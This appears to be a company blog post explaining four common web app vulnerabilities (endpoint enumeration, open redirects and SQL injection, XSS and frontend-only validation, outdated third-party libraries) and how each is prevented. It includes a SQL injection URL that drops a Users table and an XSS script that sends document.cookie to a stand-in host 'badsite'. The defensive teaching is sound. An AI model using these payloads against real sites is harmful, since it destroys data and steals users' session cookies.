# **4 Common Vulnerabilities of Web Apps**

![photo-1504639725590-34d0984388bd](https://user-images.githubusercontent.com/5280619/72622893-e3b23600-3922-11ea-88ed-0d107445c47c.jpeg)

Here at Rootstrap, security is one of the most important topics we discuss with our clients. We ensure that hackers and cyber-thieves can’t access any sensitive information from our client’s web apps.

In this blog post, you’ll learn four common security vulnerabilities in web applications. You’ll also discover how hackers can exploit these vulnerabilities and how we prevent that from happening.


## 
**1) Public Endpoints**

First, what’s an endpoint?

An endpoint is a connection point of an application.

For the sake of simplicity, below are a few examples:



*   /this-is-an-endpoint
*   /another/endpoint
*   /some/other/endpoint

Here’s how they would look like when we put them on a website:



*   https://example.com/this-is-an-endpoint
*   https://example.com/another/endpoint
*   https://example.com/some/other/endpoint

An endpoint can either be public or private.

When an endpoint is public, it’s accessible to everyone. Sometimes, this is a requirement because there’s a feature anyone should be able to use.


### 
**Possible Exploit: Enumeration**



*   Enumeration is the process of extracting information by iterating over an endpoint.

### 
**Example:**

*   If a web app has an endpoint that tells a malicious actor that an email address has been used to sign up, then it can be exploited. A hacker could iterate over a list of email addresses to find the ones that were used in an app or site. The attacker could then impersonate the business and ask those users for their passwords.

### 
**Solutions:**

*   At Rootstrap, we make sure we’re aware of all public endpoints that exist in a web app and add authentication where needed.
*   When the first solution isn’t possible, we add a limit to requests that could come from a single IP address. This helps us prevent the use of automatic scripts.

## 
**2) Unsanitized Input Data**


When a web user inputs data into a form, it must be sanitized before it’s processed.

Why should data be sanitized?

An unsanitized input data may contain code which could change the way a web app works. That’s why sanitization is important.

Sanitization is the process of cleaning, removing, and validating the data submitted by a user before processing it.


### 
**Possible Exploits: Open Redirects and SQL Injections**



*   Open Redirects: This is a security weakness that makes a web app fails to authenticate the URLs. Depending on how the web app is built, an open redirect could happen after an action, e.g., login, sign up. After the action, users are redirected to a phony page made by the attacker. Sometimes, it could occur immediately the user loads the app.
*   SQL Injection: This is a common security flaw that allows the attacker to use malicious SQL code to access and delete information in the database.

### 
**Examples:**

*   A redirect to a malicious site after the user has taken some actions.
*   A web site that has search functionality and doesn’t sanitize data is vulnerable. An attacker could input an SQL statement like this to the URL to delete the Users table in the database: `http://mysite.com/?s=something_to_search; DROP TABLE Users`

### 
**Solutions:**

*   Sanitize the URL parameters by ensuring that JavaScript code, illegal characters, etc., are removed before processing the data.
*   Only allow redirection from URL parameters to your domain.
*   Sanitize user inputs used in your SQL queries.

## 
**3) Frontend Validations**


Frontend validations help to ensure that users fill out the data in the correct format. But this isn’t always enough. 


### 
**Possible Exploits: Cross-site Scripting and Bypass Validations**



*   Cross-site scripting (XSS) allows malicious actors to insert client-side scripts into web pages viewed by users. 
*   Attackers can easily bypass frontend validations. Hackers can intercept the payload and change the data when only frontend validations are used.

### 
**Examples:**

*   Malicious actors can still upload executable files like a JavaScript code on a web app that only allows images if frontend validations are solely used. 
*   Attackers can use the comment section in a web app with an XSS vulnerability to steal cookies. They can insert the below JavaScript code. This code will send cookies to the malicious site each time the user loads the page: `<script>new Image().src="http://badsite/?s="+document.cookie;</script>`

### 
**Solutions:**

*   Use backend validations too. Don’t rely on frontend validations alone. 
*   Sanitize user inputs in the backend to ensure that only valid values are allowed. 

## 
**4) Third-Party Libraries**


A third-party library is a reusable component developed externally. Using external libraries has many benefits. One of them is that it improves the development speed. But it also has some drawbacks.


### 
**Possible Exploits: Third-Party Library Vulnerabilities**

Most modern web apps use a lot of third-party libraries. Just like your app, these libraries have their vulnerabilities malicious actors may exploit. 


### 
**Examples:**



*   If a third-party library wasn’t updated for a long time, it could have some vulnerabilities that are known to attackers. 
*   A popular open source library could get hacked and updated with malicious code. Using the library would leave your web app open to attacks.

### 
**Solutions**

*   Does your web app need a third-party library? Make sure its pros outweigh its cons before using the library.
*   You should also be aware of issues with the third-party libraries you use in your app. For example, Github alerts you of potential vulnerabilities in JS libraries.

## 
**Conclusion**


When building a web app, keep in mind the vulnerabilities that you could face. Here at Rootstrap, we think of ways to prevent those vulnerabilities in the initial stages of design and development.

We know that the trust of the users is the most valuable asset an app or a business must have. That is why we like to discuss security with our clients.


<!-- Docs to Markdown version 1.0β17 -->
